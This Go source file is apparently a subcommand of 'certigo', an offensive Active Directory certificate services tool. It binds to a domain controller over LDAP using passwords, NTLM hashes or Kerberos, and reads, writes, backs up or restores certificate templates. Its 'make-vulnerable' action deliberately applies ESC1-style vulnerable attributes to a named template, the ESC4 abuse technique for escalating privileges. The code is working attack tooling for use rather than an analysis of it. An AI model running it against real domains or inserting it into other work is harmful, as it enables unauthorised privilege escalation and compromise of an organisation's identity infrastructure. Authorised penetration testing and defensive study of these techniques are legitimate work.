package main

import (
	"encoding/json"
	"fmt"
	"os"
	"sort"
	"strings"

	"github.com/spf13/cobra"

	"github.com/ajm4n/certigo/internal/adcs"
	"github.com/ajm4n/certigo/internal/auth"
	"github.com/ajm4n/certigo/internal/ldap"
	"github.com/ajm4n/certigo/internal/template"
)

type templateFlags struct {
	username, password, domain, hashes, dcHost string
	port                                       int
	useTLS, insecure, useKrb                   bool

	action   string
	name     string
	file     string
	attrs    []string
	configNC string
}

func newTemplateCmd() *cobra.Command {
	f := &templateFlags{}
	cmd := &cobra.Command{
		Use:   "template",
		Short: "Read, write, or backup certificate template objects via LDAP (ESC4)",
		RunE: func(cmd *cobra.Command, args []string) error {
			return runTemplate(f)
		},
	}
	fl := cmd.Flags()
	fl.StringVarP(&f.username, "username", "u", "", "AD username")
	fl.StringVarP(&f.password, "password", "p", "", "AD password")
	fl.StringVarP(&f.domain, "domain", "d", "", "AD domain")
	fl.StringVar(&f.hashes, "hashes", "", "NTLM hashes (LMHASH:NTHASH)")
	fl.StringVar(&f.dcHost, "dc-host", "", "domain controller host or IP")
	fl.IntVar(&f.port, "port", 389, "LDAP port")
	fl.BoolVar(&f.useTLS, "ldaps", false, "use LDAPS")
	fl.BoolVar(&f.insecure, "ldap-insecure", false, "skip TLS verify")
	fl.BoolVarP(&f.useKrb, "kerberos", "k", false, "use Kerberos GSSAPI bind")

	fl.StringVar(&f.action, "action", "read", "read|write|backup|restore|make-vulnerable")
	fl.StringVar(&f.name, "name", "", "template name (required)")
	fl.StringVar(&f.file, "file", "", "JSON path for backup/restore")
	fl.StringArrayVar(&f.attrs, "attrs", nil, "key=value LDAP attribute (repeatable, write only)")
	fl.StringVar(&f.configNC, "configuration-dn", "", "configuration NC (discovered via RootDSE if empty)")
	return cmd
}

func runTemplate(f *templateFlags) error {
	if f.name == "" {
		return fmt.Errorf("template: --name required")
	}

	creds := &auth.Credentials{
		Username: f.username, Domain: f.domain, Password: f.password,
		UseKerberos: f.useKrb, KDCHost: f.dcHost,
	}
	if f.hashes != "" {
		lm, nt, err := auth.ParseHashes(f.hashes)
		if err != nil {
			return err
		}
		creds.LMHash, creds.NTHash = lm, nt
	}
	if err := creds.Validate(); err != nil {
		return err
	}
	if f.dcHost == "" {
		return fmt.Errorf("template: --dc-host required")
	}

	conn, err := ldap.Dial(ldap.DialOptions{
		Server:             fmt.Sprintf("%s:%d", f.dcHost, f.port),
		UseTLS:             f.useTLS || f.port == 636,
		InsecureSkipVerify: f.insecure,
	})
	if err != nil {
		return fmt.Errorf("template: dial: %w", err)
	}
	defer func() { _ = conn.Close() }()

	spn := ""
	if creds.UseKerberos {
		spn = "ldap/" + f.dcHost
	}
	if err := ldap.Bind(conn, creds, spn); err != nil {
		return fmt.Errorf("template: bind: %w", err)
	}

	configNC := f.configNC
	if configNC == "" {
		_, configNC, err = adcs.RootDSE(conn)
		if err != nil {
			return fmt.Errorf("template: rootDSE: %w", err)
		}
	}

	opts := template.Options{Conn: conn, ConfigNC: configNC, Name: f.name}

	switch strings.ToLower(f.action) {
	case "read":
		attrs, err := template.Read(opts)
		if err != nil {
			return err
		}
		keys := make([]string, 0, len(attrs))
		for k := range attrs {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		for _, k := range keys {
			for _, v := range attrs[k] {
				fmt.Printf("%s: %s\n", k, v)
			}
		}
	case "backup":
		snapshot, err := template.Backup(opts)
		if err != nil {
			return err
		}
		if f.file == "" {
			fmt.Println(string(snapshot))
			return nil
		}
		if err := os.WriteFile(f.file, snapshot, 0o600); err != nil {
			return err
		}
		fmt.Printf("backup written to %s\n", f.file)
	case "restore":
		if f.file == "" {
			return fmt.Errorf("template restore: --file required")
		}
		data, err := os.ReadFile(f.file)
		if err != nil {
			return err
		}
		if err := template.Restore(opts, data); err != nil {
			return err
		}
		fmt.Printf("restored %s from %s\n", f.name, f.file)
	case "write":
		delta := make(map[string][]string)
		for _, s := range f.attrs {
			parts := strings.SplitN(s, "=", 2)
			if len(parts) != 2 {
				return fmt.Errorf("template write: bad --attrs %q (want key=value)", s)
			}
			delta[parts[0]] = append(delta[parts[0]], parts[1])
		}
		if len(delta) == 0 {
			return fmt.Errorf("template write: at least one --attrs required")
		}
		if err := template.Write(opts, delta); err != nil {
			return err
		}
		fmt.Printf("wrote %d attributes on %s\n", len(delta), f.name)
	case "make-vulnerable":
		if f.file != "" {
			snap, err := template.Backup(opts)
			if err != nil {
				return fmt.Errorf("backup before vulnerability: %w", err)
			}
			if err := os.WriteFile(f.file, snap, 0o600); err != nil {
				return err
			}
			fmt.Printf("backup saved to %s - restore with: certigo template --action restore --name %s --file %s\n",
				f.file, f.name, f.file)
		}
		if err := template.Write(opts, template.VulnerableAttrs()); err != nil {
			return err
		}
		fmt.Printf("applied ESC1-style vulnerable attributes to %s\n", f.name)
	default:
		return fmt.Errorf("template: unknown --action %q", f.action)
	}
	return nil
}

// ensure json import is used
var _ = json.Marshal
